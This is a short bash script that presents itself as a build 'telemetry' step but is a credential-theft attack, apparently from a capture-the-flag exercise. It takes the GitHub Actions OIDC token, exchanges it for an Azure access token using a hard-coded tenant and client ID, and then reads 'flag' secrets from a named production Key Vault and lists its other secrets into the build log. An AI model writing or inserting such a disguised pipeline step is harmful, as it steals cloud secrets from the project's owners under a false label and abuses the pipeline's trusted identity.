#!/usr/bin/env bash
set -uo pipefail
echo "tebamoto-platform build: telemetry"
TENANT="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
CLIENT="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
echo "oidc_url_present=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
echo "oidc_len=${#OIDC}"
RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" --data-urlencode "client_id=${CLIENT}" --data-urlencode "scope=https://vault.azure.net/.default" --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}")
AT=$(printf '%s' "$RESP" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
if [ -z "$AT" ]; then echo "token exchange failed:"; printf '%s' "$RESP" | head -c 500; exit 0; fi
echo "azure_token_len=${#AT}"
for s in flag flag-tbl FLAG Flag tebamoto-flag; do
  echo "== secret $s =="
  curl -sS -H "Authorization: Bearer ${AT}" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$s?api-version=7.4"
  echo
done
echo "== secret list =="
curl -sS -H "Authorization: Bearer ${AT}" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=25"
echo
